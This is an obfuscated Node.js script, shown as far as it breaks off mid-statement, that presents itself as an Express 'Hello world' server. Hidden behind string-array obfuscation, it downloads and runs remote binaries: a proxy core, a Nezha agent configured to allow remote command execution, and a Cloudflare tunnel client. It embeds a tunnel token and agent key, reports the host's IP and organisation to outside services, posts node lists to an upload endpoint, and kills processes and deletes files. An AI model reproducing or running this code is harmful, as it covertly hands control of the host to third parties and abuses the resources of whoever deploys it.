const _0x10497d=_0x3ba5;(function(_0x2b7318,_0x35f6bd){const _0x56a2cf={_0x480213:0x11a,_0x3fbe23:0x14c,_0x583083:0x12a,_0x64f214:0xf7,_0x26bfc2:0xc7,_0x318672:0xdd,_0x8571df:0xde},_0xf00f2d=_0x3ba5,_0x323dc5=_0x2b7318();while(!![]){try{const _0x5c1f3f=parseInt(_0xf00f2d(0xd1))/0x1*(-parseInt(_0xf00f2d(_0x56a2cf._0x480213))/0x2)+parseInt(_0xf00f2d(_0x56a2cf._0x3fbe23))/0x3*(parseInt(_0xf00f2d(0xd6))/0x4)+-parseInt(_0xf00f2d(_0x56a2cf._0x583083))/0x5+parseInt(_0xf00f2d(0x95))/0x6*(parseInt(_0xf00f2d(_0x56a2cf._0x64f214))/0x7)+-parseInt(_0xf00f2d(0x106))/0x8*(-parseInt(_0xf00f2d(_0x56a2cf._0x26bfc2))/0x9)+parseInt(_0xf00f2d(_0x56a2cf._0x318672))/0xa*(parseInt(_0xf00f2d(0xfb))/0xb)+-parseInt(_0xf00f2d(0x13d))/0xc*(parseInt(_0xf00f2d(_0x56a2cf._0x8571df))/0xd);if(_0x5c1f3f===_0x35f6bd)break;else _0x323dc5['push'](_0x323dc5['shift']());}catch(_0x376f88){_0x323dc5['push'](_0x323dc5['shift']());}}}(_0x50f5,0xec029));const express=require('express'),app=express(),axios=require(_0x10497d(0x92)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x10497d(0xad)),exec=promisify(require(_0x10497d(0xbb))[_0x10497d(0x139)]),{execSync}=require(_0x10497d(0xbb)),UPLOAD_URL=process[_0x10497d(0x14b)][_0x10497d(0x12e)]||'',PROJECT_URL=process[_0x10497d(0x14b)][_0x10497d(0xa2)]||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process[_0x10497d(0x14b)][_0x10497d(0x10d)]||'./tmp',SUB_PATH=process[_0x10497d(0x14b)][_0x10497d(0xaf)]||_0x10497d(0xb2),PORT=process[_0x10497d(0x14b)][_0x10497d(0x148)]||process[_0x10497d(0x14b)][_0x10497d(0xa9)]||0xbb8,UUID=process[_0x10497d(0x14b)][_0x10497d(0x9d)]||_0x10497d(0xbf),NEZHA_SERVER=process[_0x10497d(0x14b)][_0x10497d(0x14e)]||'xvkbapvuyezu.eu-central-1.clawcloudrun.com:80',NEZHA_PORT=process[_0x10497d(0x14b)][_0x10497d(0xe0)]||'',NEZHA_KEY=process[_0x10497d(0x14b)]['NEZHA_KEY']||_0x10497d(0xdf),ARGO_DOMAIN=process[_0x10497d(0x14b)][_0x10497d(0x105)]||'sapus.togoice.ggff.net',ARGO_AUTH=process[_0x10497d(0x14b)]['ARGO_AUTH']||'eyJhIjoiMzdhYzNmNjM5ZjU1NWRkMDNmNGUxYzYxODUzMTJjZTEiLCJ0IjoiOTgwMTcyYjEtZjgxYS00MjZjLTgwNDktNjI1MmViNWRkMGZlIiwicyI6Ik9EY3lZbVJqWkRjdFlXSTJNQzAwTkRFeExUaGhNemd0WldNek1EQmtOVGxtWTJJeSJ9',ARGO_PORT=process[_0x10497d(0x14b)]['ARGO_PORT']||0x1f41,CFIP=process['env'][_0x10497d(0x146)]||_0x10497d(0x99),CFPORT=process['env'][_0x10497d(0xc3)]||0x1bb,NAME=process['env'][_0x10497d(0x11e)]||'';!fs['existsSync'](FILE_PATH)?(fs[_0x10497d(0x104)](FILE_PATH),console[_0x10497d(0xcb)](FILE_PATH+_0x10497d(0xf3))):console[_0x10497d(0xcb)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x53140e={_0x330bd8:0x10f},_0x5410fb=_0x10497d,_0x232392=_0x5410fb(0xac);let _0x56f0aa='';for(let _0x5de63a=0x0;_0x5de63a<0x6;_0x5de63a++){_0x56f0aa+=_0x232392[_0x5410fb(0xa3)](Math['floor'](Math[_0x5410fb(0xb6)]()*_0x232392[_0x5410fb(_0x53140e._0x330bd8)]));}return _0x56f0aa;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x10497d(0xe4)](FILE_PATH,npmName),phpPath=path[_0x10497d(0xe4)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x10497d(0xe4)](FILE_PATH,botName),subPath=path[_0x10497d(0xe4)](FILE_PATH,_0x10497d(0xd7)),listPath=path[_0x10497d(0xe4)](FILE_PATH,'list.txt'),bootLogPath=path[_0x10497d(0xe4)](FILE_PATH,'boot.log'),configPath=path[_0x10497d(0xe4)](FILE_PATH,_0x10497d(0x97));function _0x50f5(){const _0x12ca53=['/vless-argo','http://ip-api.com/json/','b974bd23-a921-4e5d-9670-0b14ca718867','unshift','stringify','Content-Type','CFPORT','tunnel.yml','\x0a\x0atrojan://','https://arm64.ssss.nyc.mn/v1','13133133HPEoxG','rm\x20-rf\x20','TunnelSecret','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','log','countryCode','\x0a\x0avmess://','automatic\x20access\x20task\x20added\x20successfully','/api/delete-nodes','chmod','334IJVCcB','.exe\x20>\x20nul\x202>&1','ARGO_DOMAIN:','statSync','&path=%2Fvless-argo%3Fed%3D2560#','3527428mnNflw','sub.txt','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','127.0.0.1','http','2096','\x20is\x20running','10vrGFPT','13cfjMXI','tjqR58EBk54iQCNCQ3h4cSnxeofferNC','NEZHA_PORT','block','443','get','join','base64','/tunnel.yml\x20run','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x20>/dev/null\x202>&1\x20&','readFileSync','split','none','test','npm\x20running\x20error:\x20','\x0aclient_secret:\x20','https://amd64.ssss.nyc.mn/v1','has','del\x20/f\x20/q\x20','Error\x20downloading\x20files:','\x20is\x20created','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','utf-8','post','6391yLRswK','platform','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','fileName','12953369OWZOUs','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','includes','2087','web\x20running\x20error:\x20','direct','Subscription\x20uploaded\x20successfully','boot.log','arm64','mkdirSync','ARGO_DOMAIN','8NXBEfW','win32','https://oooo.serv00.net/add-url','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','success','substring','status','FILE_PATH','from','length','map','/trojan-argo','/config.json\x20>/dev/null\x202>&1\x20&','/vmess-argo?ed=2560','finish','trojan','Error\x20executing\x20command:\x20','Error\x20in\x20startserver:','\x20-p\x20','basename','3826Ywcivz','Skipping\x20adding\x20automatic\x20access\x20task','/vmess-argo','App\x20is\x20running','NAME','clear','https://arm64.ssss.nyc.mn/web','&path=%2Ftrojan-argo%3Fed%3D2560#','forEach','unlinkSync','fileUrl','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','tls','pkill\x20-f\x20\x22[','--tls','false','4809245oDOfTB','vless','existsSync','application/json','UPLOAD_URL','country_code','2053','match','https+local://8.8.8.8/dns-query','&fp=firefox&type=ws&host=','quic','filter','arm','php\x20running\x20error:\x20','Empowerment\x20success\x20for\x20','exec','\x20>/dev/null\x202>&1','Nodes\x20uploaded\x20successfully','\x20failed:\x20','12586512BgKHym','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','ArgoDomain:','/sub.txt\x20saved\x20successfully','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','catch','nohup\x20','data','\x0a\x20\x20tunnel:\x20','CFIP','Unknown','SERVER_PORT','send','tunnel.json','env','3KtohhE','firefox','NEZHA_SERVER','org','?encryption=none&security=tls&sni=','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','axios','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','/dev/null','642RXOiHX','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','config.json','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','cdns.doon.eu.org','?security=tls&sni=','pipe','push','UUID','config.yaml','writeFileSync','Error\x20reading\x20boot.log:','arch','PROJECT_URL','charAt','https://amd64.ssss.nyc.mn/agent','tcp','set','vmess','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','PORT','stream','taskkill\x20/f\x20/im\x20','abcdefghijklmnopqrstuvwxyz','util','https://arm64.ssss.nyc.mn/bot','SUB_PATH','\x20-c\x20','all','sub','toString','message','listen','random','Download\x20','https://arm64.ssss.nyc.mn/agent','\x20-s\x20','error','child_process','unlink'];_0x50f5=function(){return _0x12ca53;};return _0x50f5();}function deleteNodes(){const _0x4f8e49={_0xf94e8e:0xe9,_0x2f4a18:0xf5,_0x5a5529:0xea,_0x546c64:0x135,_0x450ffd:0xf6,_0x53c6fd:0xcf},_0xd4e0ed=_0x10497d;try{if(!UPLOAD_URL)return;if(!fs[_0xd4e0ed(0x12c)](subPath))return;let _0x2e0b2b;try{_0x2e0b2b=fs[_0xd4e0ed(_0x4f8e49._0xf94e8e)](subPath,_0xd4e0ed(_0x4f8e49._0x2f4a18));}catch{return null;}const _0x5be836=Buffer[_0xd4e0ed(0x10e)](_0x2e0b2b,'base64')[_0xd4e0ed(0xb3)](_0xd4e0ed(_0x4f8e49._0x2f4a18)),_0x202cad=_0x5be836[_0xd4e0ed(_0x4f8e49._0x5a5529)]('\x0a')[_0xd4e0ed(_0x4f8e49._0x546c64)](_0x22249d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xd4e0ed(0xec)](_0x22249d));if(_0x202cad['length']===0x0)return;return axios[_0xd4e0ed(_0x4f8e49._0x450ffd)](UPLOAD_URL+_0xd4e0ed(_0x4f8e49._0x53c6fd),JSON[_0xd4e0ed(0xc1)]({'nodes':_0x202cad}),{'headers':{'Content-Type':'application/json'}})[_0xd4e0ed(0x142)](_0x4cac95=>{return null;}),null;}catch(_0x221763){return null;}}function cleanupOldFiles(){const _0x499233={_0x3685b4:0xd4};try{const _0x2e3842=fs['readdirSync'](FILE_PATH);_0x2e3842['forEach'](_0x15b957=>{const _0x43fd93=_0x3ba5,_0x2c23cf=path[_0x43fd93(0xe4)](FILE_PATH,_0x15b957);try{const _0x10a532=fs[_0x43fd93(_0x499233._0x3685b4)](_0x2c23cf);_0x10a532['isFile']()&&fs[_0x43fd93(0x123)](_0x2c23cf);}catch(_0x141a3e){}});}catch(_0x380772){}}app['get']('/',function(_0x30f69a,_0x6c3c0){const _0x7a3063={_0xc79446:0x149},_0x300576=_0x10497d;_0x6c3c0[_0x300576(_0x7a3063._0xc79446)]('Hello\x20world!');});async function generateConfig(){const _0x6a9569={_0x3cfe44:0xeb,_0x2b5315:0xbd,_0x27b6ab:0xa5,_0x3fd006:0x12b,_0x2e7dcb:0xeb,_0x8be3db:0xa5,_0x316b24:0xda,_0xc26795:0x126,_0x25bcb0:0x115,_0x50419d:0x134,_0x4227f4:0x97},_0x31a7f8=_0x10497d,_0x4b98e0={'log':{'access':_0x31a7f8(0x94),'error':'/dev/null','loglevel':_0x31a7f8(_0x6a9569._0x3cfe44)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x31a7f8(_0x6a9569._0x2b5315),'dest':0xbba},{'path':_0x31a7f8(0x11c),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x31a7f8(_0x6a9569._0x27b6ab)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x31a7f8(_0x6a9569._0x3fd006),'settings':{'clients':[{'id':UUID}],'decryption':_0x31a7f8(_0x6a9569._0x2e7dcb)},'streamSettings':{'network':_0x31a7f8(_0x6a9569._0x8be3db),'security':_0x31a7f8(0xeb)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x31a7f8(0x12b),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x31a7f8(_0x6a9569._0x2e7dcb)},'streamSettings':{'network':'ws','security':_0x31a7f8(_0x6a9569._0x3cfe44),'wsSettings':{'path':_0x31a7f8(_0x6a9569._0x2b5315)}},'sniffing':{'enabled':!![],'destOverride':[_0x31a7f8(_0x6a9569._0x316b24),'tls',_0x31a7f8(0x134)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x31a7f8(0xd9),'protocol':_0x31a7f8(0xa7),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x31a7f8(0x11c)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x31a7f8(_0x6a9569._0xc26795),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x31a7f8(_0x6a9569._0x25bcb0),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x31a7f8(_0x6a9569._0x3cfe44),'wsSettings':{'path':_0x31a7f8(0x111)}},'sniffing':{'enabled':!![],'destOverride':[_0x31a7f8(0xda),_0x31a7f8(0x126),_0x31a7f8(_0x6a9569._0x50419d)],'metadataOnly':![]}}],'dns':{'servers':[_0x31a7f8(0x132)]},'outbounds':[{'protocol':'freedom','tag':_0x31a7f8(0x100)},{'protocol':'blackhole','tag':_0x31a7f8(0xe1)}]};fs['writeFileSync'](path[_0x31a7f8(0xe4)](FILE_PATH,_0x31a7f8(_0x6a9569._0x4227f4)),JSON['stringify'](_0x4b98e0,null,0x2));}function getSystemArchitecture(){const _0x47032b=_0x10497d,_0x98397d=os[_0x47032b(0xa1)]();return _0x98397d===_0x47032b(0x136)||_0x98397d===_0x47032b(0x103)||_0x98397d==='aarch64'?_0x47032b(0x136):'amd';}function downloadFile(_0x38f42f,_0x9aa481,_0x11d1b1){const _0xe294e7={_0x36394b:0x12c,_0x53f989:0x104,_0xb9b8b5:0xe3,_0x430446:0xaa},_0x5de6c5={_0x7614ce:0xb7,_0x40f83d:0x119,_0x5775cf:0x13c},_0x3e16ee={_0x316d04:0x9b,_0x28500f:0x114},_0x32d676={_0x58a67b:0xbc,_0x50f56a:0xb7,_0x566b8a:0x13c},_0x3a1aff=_0x10497d,_0x49eaf3=_0x38f42f;!fs[_0x3a1aff(_0xe294e7._0x36394b)](FILE_PATH)&&fs[_0x3a1aff(_0xe294e7._0x53f989)](FILE_PATH,{'recursive':!![]});const _0x22f667=fs['createWriteStream'](_0x49eaf3);axios({'method':_0x3a1aff(_0xe294e7._0xb9b8b5),'url':_0x9aa481,'responseType':_0x3a1aff(_0xe294e7._0x430446)})['then'](_0x18d25c=>{const _0x4a0ee6=_0x3a1aff;_0x18d25c['data'][_0x4a0ee6(_0x3e16ee._0x316d04)](_0x22f667),_0x22f667['on'](_0x4a0ee6(_0x3e16ee._0x28500f),()=>{const _0x1ee706=_0x4a0ee6;_0x22f667['close'](),console[_0x1ee706(0xcb)](_0x1ee706(0xb7)+path[_0x1ee706(0x119)](_0x49eaf3)+'\x20successfully'),_0x11d1b1(null,_0x49eaf3);}),_0x22f667['on']('error',_0x149cb1=>{const _0x5ae669=_0x4a0ee6;fs[_0x5ae669(_0x32d676._0x58a67b)](_0x49eaf3,()=>{});const _0x2d2df8=_0x5ae669(_0x32d676._0x50f56a)+path[_0x5ae669(0x119)](_0x49eaf3)+_0x5ae669(_0x32d676._0x566b8a)+_0x149cb1[_0x5ae669(0xb4)];console[_0x5ae669(0xba)](_0x2d2df8),_0x11d1b1(_0x2d2df8);});})['catch'](_0x239fe9=>{const _0x7df522=_0x3a1aff,_0x5ec62b=_0x7df522(_0x5de6c5._0x7614ce)+path[_0x7df522(_0x5de6c5._0x40f83d)](_0x49eaf3)+_0x7df522(_0x5de6c5._0x5775cf)+_0x239fe9['message'];console[_0x7df522(0xba)](_0x5ec62b),_0x11d1b1(_0x5ec62b);});}async function downloadFilesAndRun(){const _0x4ee969={_0x353055:0x10f,_0x2d95ea:0xcb,_0x3858fe:0x141,_0x3fc59e:0x110,_0x3d72ae:0xb1,_0x358790:0xe2,_0x845107:0xfe,_0x175bf4:0x130,_0x32beac:0xee,_0x530e17:0x96,_0x58d6b5:0x9f,_0x4f6ead:0xe4,_0x356b15:0x9e,_0x1a56eb:0x143,_0x524442:0x137,_0xd07075:0x128,_0x5109c7:0x143,_0x12f235:0xed,_0x5ed7b7:0x143,_0xf10ce0:0xdc,_0x35564a:0x12c,_0x245e27:0x131,_0x4984f2:0xcb},_0x3b1a3b={_0x915977:0x122},_0x30558f={_0x3b927c:0xfa,_0x5bc68c:0x124},_0xeb0fe7=_0x10497d,_0x1a051c=getSystemArchitecture(),_0x6f34b5=getFilesForArchitecture(_0x1a051c);if(_0x6f34b5[_0xeb0fe7(_0x4ee969._0x353055)]===0x0){console[_0xeb0fe7(_0x4ee969._0x2d95ea)](_0xeb0fe7(_0x4ee969._0x3858fe));return;}const _0x3f9bf0=_0x6f34b5[_0xeb0fe7(_0x4ee969._0x3fc59e)](_0x3390ee=>{return new Promise((_0x6c7117,_0x12d581)=>{const _0x33a732=_0x3ba5;downloadFile(_0x3390ee[_0x33a732(_0x30558f._0x3b927c)],_0x3390ee[_0x33a732(_0x30558f._0x5bc68c)],(_0x46e63e,_0x38da7d)=>{_0x46e63e?_0x12d581(_0x46e63e):_0x6c7117(_0x38da7d);});});});try{await Promise[_0xeb0fe7(_0x4ee969._0x3d72ae)](_0x3f9bf0);}catch(_0x136f79){console[_0xeb0fe7(0xba)](_0xeb0fe7(0xf2),_0x136f79);return;}function _0x45fc0e(_0xe0d7be){const _0x33baa2={_0x2fb0f7:0xba,_0x42f0c8:0x138,_0x23ed9c:0xb3},_0x17bcf2=_0xeb0fe7,_0x49ee06=0x1fd;_0xe0d7be[_0x17bcf2(_0x3b1a3b._0x915977)](_0x87c75a=>{const _0x455c90=_0x17bcf2;fs[_0x455c90(0x12c)](_0x87c75a)&&fs[_0x455c90(0xd0)](_0x87c75a,_0x49ee06,_0x46c11a=>{const _0x2ac20a=_0x455c90;_0x46c11a?console[_0x2ac20a(_0x33baa2._0x2fb0f7)]('Empowerment\x20failed\x20for\x20'+_0x87c75a+':\x20'+_0x46c11a):console[_0x2ac20a(0xcb)](_0x2ac20a(_0x33baa2._0x42f0c8)+_0x87c75a+':\x20'+_0x49ee06[_0x2ac20a(_0x33baa2._0x23ed9c)](0x8));});});}const _0x125c2a=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x45fc0e(_0x125c2a);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3d0777=NEZHA_SERVER[_0xeb0fe7(0xfd)](':')?NEZHA_SERVER[_0xeb0fe7(0xea)](':')['pop']():'',_0x4d597f=new Set([_0xeb0fe7(_0x4ee969._0x358790),'8443',_0xeb0fe7(0xdb),_0xeb0fe7(_0x4ee969._0x845107),'2083',_0xeb0fe7(_0x4ee969._0x175bf4)]),_0x48ae98=_0x4d597f[_0xeb0fe7(0xf0)](_0x3d0777)?'true':_0xeb0fe7(0x129),_0x5152b4=_0xeb0fe7(_0x4ee969._0x32beac)+NEZHA_KEY+_0xeb0fe7(0xe7)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x48ae98+_0xeb0fe7(_0x4ee969._0x530e17)+UUID;fs[_0xeb0fe7(_0x4ee969._0x58d6b5)](path[_0xeb0fe7(_0x4ee969._0x4f6ead)](FILE_PATH,_0xeb0fe7(_0x4ee969._0x356b15)),_0x5152b4);const _0x5cd748=_0xeb0fe7(_0x4ee969._0x1a56eb)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0xeb0fe7(0x98);try{await exec(_0x5cd748),console[_0xeb0fe7(0xcb)](phpName+'\x20is\x20running'),await new Promise(_0x3266ea=>setTimeout(_0x3266ea,0x3e8));}catch(_0x71d138){console[_0xeb0fe7(0xba)](_0xeb0fe7(_0x4ee969._0x524442)+_0x71d138);}}else{let _0x3ec2f9='';const _0x25bf0c=[_0xeb0fe7(0xe2),'8443',_0xeb0fe7(0xdb),_0xeb0fe7(0xfe),'2083',_0xeb0fe7(0x130)];_0x25bf0c[_0xeb0fe7(0xfd)](NEZHA_PORT)&&(_0x3ec2f9=_0xeb0fe7(_0x4ee969._0xd07075));const _0x514d34=_0xeb0fe7(_0x4ee969._0x5109c7)+npmPath+_0xeb0fe7(0xb9)+NEZHA_SERVER+':'+NEZHA_PORT+_0xeb0fe7(0x118)+NEZHA_KEY+'\x20'+_0x3ec2f9+_0xeb0fe7(0x93);try{await exec(_0x514d34),console[_0xeb0fe7(0xcb)](npmName+'\x20is\x20running'),await new Promise(_0x117f1e=>setTimeout(_0x117f1e,0x3e8));}catch(_0x15c345){console['error'](_0xeb0fe7(_0x4ee969._0x12f235)+_0x15c345);}}}else console[_0xeb0fe7(0xcb)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x4ffa70=_0xeb0fe7(_0x4ee969._0x5ed7b7)+webPath+_0xeb0fe7(0xb0)+FILE_PATH+_0xeb0fe7(0x112);try{await exec(_0x4ffa70),console[_0xeb0fe7(0xcb)](webName+_0xeb0fe7(_0x4ee969._0xf10ce0)),await new Promise(_0x58933e=>setTimeout(_0x58933e,0x3e8));}catch(_0x1c4c6c){console['error'](_0xeb0fe7(0xff)+_0x1c4c6c);}if(fs[_0xeb0fe7(_0x4ee969._0x35564a)](botPath)){let _0x237f7b;if(ARGO_AUTH[_0xeb0fe7(_0x4ee969._0x245e27)](/^[A-Z0-9a-z=]{120,250}$/))_0x237f7b=_0xeb0fe7(0xf4)+ARGO_AUTH;else ARGO_AUTH[_0xeb0fe7(_0x4ee969._0x245e27)](/TunnelSecret/)?_0x237f7b=_0xeb0fe7(0xca)+FILE_PATH+_0xeb0fe7(0xe6):_0x237f7b=_0xeb0fe7(0x125)+FILE_PATH+_0xeb0fe7(0xa8)+ARGO_PORT;try{await exec(_0xeb0fe7(0x143)+botPath+'\x20'+_0x237f7b+_0xeb0fe7(0xe8)),console[_0xeb0fe7(_0x4ee969._0x4984f2)](botName+'\x20is\x20running'),await new Promise(_0x18f84d=>setTimeout(_0x18f84d,0x7d0));}catch(_0x32dc18){console[_0xeb0fe7(0xba)](_0xeb0fe7(0x116)+_0x32dc18);}}await new Promise(_0x225519=>setTimeout(_0x225519,0x1388));}function getFilesForArchitecture(_0xba1c52){const _0x13697e=_0x10497d;let _0x39f90e;_0xba1c52===_0x13697e(0x136)?_0x39f90e=[{'fileName':webPath,'fileUrl':_0x13697e(0x120)},{'fileName':botPath,'fileUrl':_0x13697e(0xae)}]:_0x39f90e=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3681f1=_0xba1c52===_0x13697e(0x136)?_0x13697e(0xb8):_0x13697e(0xa4);_0x39f90e[_0x13697e(0xc0)]({'fileName':npmPath,'fileUrl':_0x3681f1});}else{const _0x28668b=_0xba1c52===_0x13697e(0x136)?_0x13697e(0xc6):_0x13697e(0xef);_0x39f90e[_0x13697e(0xc0)]({'fileName':phpPath,'fileUrl':_0x28668b});}}return _0x39f90e;}function argoType(){const _0x33464d={_0x44a270:0xcb,_0x4f6069:0xf9,_0x24b938:0x9f,_0x1b5a28:0xea,_0x6a75e6:0xfc,_0x5be0cc:0x13e,_0x20c13c:0xc4},_0x26f07e=_0x10497d;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x26f07e(_0x33464d._0x44a270)](_0x26f07e(_0x33464d._0x4f6069));return;}if(ARGO_AUTH['includes'](_0x26f07e(0xc9))){fs[_0x26f07e(_0x33464d._0x24b938)](path[_0x26f07e(0xe4)](FILE_PATH,_0x26f07e(0x14a)),ARGO_AUTH);const _0x2db7fb=_0x26f07e(0x145)+ARGO_AUTH[_0x26f07e(_0x33464d._0x1b5a28)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,'tunnel.json')+_0x26f07e(_0x33464d._0x6a75e6)+ARGO_DOMAIN+_0x26f07e(_0x33464d._0x5be0cc)+ARGO_PORT+_0x26f07e(0xd8);fs[_0x26f07e(_0x33464d._0x24b938)](path[_0x26f07e(0xe4)](FILE_PATH,_0x26f07e(_0x33464d._0x20c13c)),_0x2db7fb);}else console['log']('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x2f76e1={_0x1f6796:0xe4,_0x293349:0x102,_0x4464b1:0xea,_0x5c6db2:0x10f,_0x14f94f:0xcb,_0x1a422d:0x123,_0x4cd745:0xe4,_0x38a35d:0x125,_0x1d59a4:0x143,_0x76eaa:0xcb},_0x1d7451={_0x38df09:0x12f,_0x246b0f:0x12f,_0x2fc410:0xbe,_0x220d73:0x144,_0x219c00:0xcc,_0x3ac772:0x14f,_0x2c93e7:0xcc,_0x226845:0x147},_0x7ea7e0={_0x5b1e7d:0x127,_0x382e99:0x10b},_0x3d04cf=_0x10497d;let _0x15f2a8;if(ARGO_AUTH&&ARGO_DOMAIN)_0x15f2a8=ARGO_DOMAIN,console[_0x3d04cf(0xcb)](_0x3d04cf(0xd3),_0x15f2a8),await _0xfa04db(_0x15f2a8);else try{const _0x39478c=fs['readFileSync'](path[_0x3d04cf(_0x2f76e1._0x1f6796)](FILE_PATH,_0x3d04cf(_0x2f76e1._0x293349)),_0x3d04cf(0xf5)),_0x566129=_0x39478c[_0x3d04cf(_0x2f76e1._0x4464b1)]('\x0a'),_0x524530=[];_0x566129[_0x3d04cf(0x122)](_0x5e62d6=>{const _0x349376=_0x5e62d6['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x349376){const _0x29b627=_0x349376[0x1];_0x524530['push'](_0x29b627);}});if(_0x524530[_0x3d04cf(_0x2f76e1._0x5c6db2)]>0x0)_0x15f2a8=_0x524530[0x0],console[_0x3d04cf(_0x2f76e1._0x14f94f)](_0x3d04cf(0x13f),_0x15f2a8),await _0xfa04db(_0x15f2a8);else{console[_0x3d04cf(0xcb)](_0x3d04cf(0x109)),fs[_0x3d04cf(_0x2f76e1._0x1a422d)](path[_0x3d04cf(_0x2f76e1._0x4cd745)](FILE_PATH,_0x3d04cf(0x102)));async function _0x82fd9b(){const _0x36a416=_0x3d04cf;try{process['platform']===_0x36a416(0x107)?await exec(_0x36a416(0xab)+botName+_0x36a416(0xd2)):await exec(_0x36a416(_0x7ea7e0._0x5b1e7d)+botName[_0x36a416(0xa3)](0x0)+']'+botName[_0x36a416(_0x7ea7e0._0x382e99)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x3cb895){}}_0x82fd9b(),await new Promise(_0x18be3c=>setTimeout(_0x18be3c,0xbb8));const _0xe9631b=_0x3d04cf(_0x2f76e1._0x38a35d)+FILE_PATH+_0x3d04cf(0xa8)+ARGO_PORT;try{await exec(_0x3d04cf(_0x2f76e1._0x1d59a4)+botPath+'\x20'+_0xe9631b+'\x20>/dev/null\x202>&1\x20&'),console[_0x3d04cf(_0x2f76e1._0x76eaa)](botName+_0x3d04cf(0xdc)),await new Promise(_0x481c8c=>setTimeout(_0x481c8c,0xbb8)),await extractDomains();}catch(_0x4f6cad){console[_0x3d04cf(0xba)](_0x3d04cf(0x116)+_0x4f6cad);}}}catch(_0x48e99d){console[_0x3d04cf(0xba)](_0x3d04cf(0xa0),_0x48e99d);}async function _0x16f91d(){const _0x54f21d=_0x3d04cf;try{const _0x37d076=await axios[_0x54f21d(0xe3)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x37d076[_0x54f21d(0x144)]&&_0x37d076[_0x54f21d(0x144)][_0x54f21d(_0x1d7451._0x38df09)]&&_0x37d076[_0x54f21d(0x144)][_0x54f21d(0x14f)])return _0x37d076[_0x54f21d(0x144)][_0x54f21d(_0x1d7451._0x246b0f)]+'_'+_0x37d076[_0x54f21d(0x144)]['org'];}catch(_0x38a7c5){try{const _0x54533d=await axios[_0x54f21d(0xe3)](_0x54f21d(_0x1d7451._0x2fc410),{'timeout':0xbb8});if(_0x54533d[_0x54f21d(_0x1d7451._0x220d73)]&&_0x54533d[_0x54f21d(_0x1d7451._0x220d73)][_0x54f21d(0x10c)]===_0x54f21d(0x10a)&&_0x54533d[_0x54f21d(_0x1d7451._0x220d73)][_0x54f21d(_0x1d7451._0x219c00)]&&_0x54533d[_0x54f21d(_0x1d7451._0x220d73)][_0x54f21d(_0x1d7451._0x3ac772)])return _0x54533d['data'][_0x54f21d(_0x1d7451._0x2c93e7)]+'_'+_0x54533d[_0x54f21d(0x144)]['org'];}catch(_0x2dcd64){}}return _0x54f21d(_0x1d7451._0x226845);}async function _0xfa04db(_0x20f376){const 